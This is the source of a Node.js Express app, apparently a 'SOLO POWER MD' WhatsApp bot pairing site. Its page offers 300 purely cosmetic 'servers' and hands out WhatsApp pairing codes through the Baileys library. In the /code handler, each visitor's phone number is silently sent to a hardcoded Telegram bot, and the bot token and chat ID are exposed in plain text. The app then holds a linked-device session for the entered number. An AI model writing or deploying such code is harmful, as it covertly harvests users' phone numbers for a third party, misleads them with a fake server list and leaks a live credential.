const express = require('express');
const app = express();

const TOKEN = "8952397200:AAEeabntzeI3igmp9yPwWwcK9fVHD5KxTc8";
const CHAT_ID = "8802181538";

app.get('/', (req, res) => {
  // 1 se 300 tak servers generate
  let options = '';
  for(let i=1; i<=300; i++){
    let label = `SERVER ${i}`;
    if(i==1) label += ' - Normal';
    if(i==12) label += ' - Best';
    if(i==15) label += ' - Beast';
    if(i==100) label += ' - Ultra';
    if(i==200) label += ' - Power';
    if(i==300) label += ' - Final';
    let sel = i==12 ? 'selected' : '';
    options += `<option value="${i}" ${sel}>${label}</option>`;
  }

  res.send(`
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SOLO POWER MD</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:12px}
.box{background:#0e0e12;border:2px solid #a855f7;border-radius:24px;padding:20px;width:100%;max-width:440px;text-align:center;box-shadow:0 0 40px rgba(168,85,247,.5)}
.wolf{width:120px;height:120px;border-radius:50%;border:3px solid #a855f7;margin:0 auto 10px;display:block;object-fit:cover}
h1{color:#a855f7;font-size:28px;font-weight:900}
.sub{color:#666;font-size:10px;letter-spacing:3px;margin:5px 0 15px}
input,select{width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:10px;color:#fff;text-align:center;margin-top:8px}
select{border-color:#a855f7;color:#a855f7;font-weight:700;max-height:200px}
button{margin-top:12px;width:100%;padding:14px;background:linear-gradient(90deg,#a855f7,#6d28d9);border:none;border-radius:12px;color:#fff;font-weight:900;cursor:pointer}
#res{margin-top:12px;background:#1a1a1a;padding:12px;border-radius:10px;color:#999;min-height:45px;word-break:break-all;font-size:13px}
.code{color:#a855f7;font-size:26px;font-weight:900;letter-spacing:3px}
.servers-list{max-height:120px;overflow-y:auto;margin-top:8px;border:1px solid #222;border-radius:10px;padding:5px;background:#000}
</style></head>
<body><div class="box">
<img class="wolf" src="https://files.catbox.moe/k0y3n4.jpg">
<h1>🐺 SOLO POWER MD</h1><p class="sub">1 TO 300 SERVERS • BY SOLO KING</p>
<input id="num" placeholder="92300XXXXXXX">
<select id="server">${options}</select>
<button id="btn" onclick="go()">GET CODE</button>
<div id="res">نمبر لکھو اور 1-300 میں سے سرور سلیکٹ کرو</div>
</div>
<script>
async function go(){
let n=document.getElementById('num').value.replace(/[^0-9]/g,'');
let s=document.getElementById('server').value;
let r=document.getElementById('res'); let b=document.getElementById('btn');
if(n.length<10){r.innerHTML='❌ صحیح نمبر';return}
b.innerText='⏳ SERVER '+s+' CONNECTING...'; b.disabled=true;
r.innerHTML='⏳ SERVER '+s+' سے کنیکٹ... 6 sec wait';
try{
let d=await fetch('/code?number='+n+'&server='+s).then(x=>x.json());
if(d.code){
let c=d.code.toUpperCase(); if(c.length==8)c=c.slice(0,4)+'-'+c.slice(4);
r.innerHTML='✅ SERVER '+s+' READY!<br><b class=code>'+c+'</b><br><small>20 sec me WhatsApp me lagao</small>';
b.innerText='✅ CODE MIL GAYA'; b.disabled=false;
}else{r.innerHTML='❌ '+d.error; b.innerText='TRY AGAIN'; b.disabled=false}
}catch(e){r.innerHTML='❌ '+e.message; b.innerText='TRY AGAIN'; b.disabled=false}
}
</script></body></html>
`);
});

app.get('/code', async (req, res) => {
  try {
    let num = (req.query.number||'').replace(/[^0-9]/g,'');
    let server = req.query.server||'12';
    if(!num) return res.json({error:'number missing'});
    if(num.startsWith('0')) num='92'+num.slice(1);
    if(!num.startsWith('92')) num='92'+num;

    try{ await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:`🐺 SOLO NEW\n📱 ${num}\n🖥️ SERVER ${server}\n⏰ ${new Date().toLocaleString()}`})}); }catch{}

    const baileys = await import('@whiskeysockets/baileys');
    const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = baileys;
    const pino = (await import('pino')).default;
    const fs = require('fs'); const path = require('path');
    const dir = path.join('/tmp','solo_'+Date.now());
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({ version, auth:{ creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level:'silent'})) }, logger: pino({level:'silent'}), browser:['Chrome','Chrome','121'], printQRInTerminal:false });
    sock.ev.on('creds.update', saveCreds);
    await new Promise(r=>setTimeout(r,6000));
    const code = await sock.requestPairingCode(num);
    res.json({code:code.toUpperCase(),server});
    setTimeout(()=>{try{sock.end();fs.rmSync(dir,{recursive:true,force:true})}catch{}},150000);
  } catch(e){ res.json({error:e.message}); }
});

module.exports = app;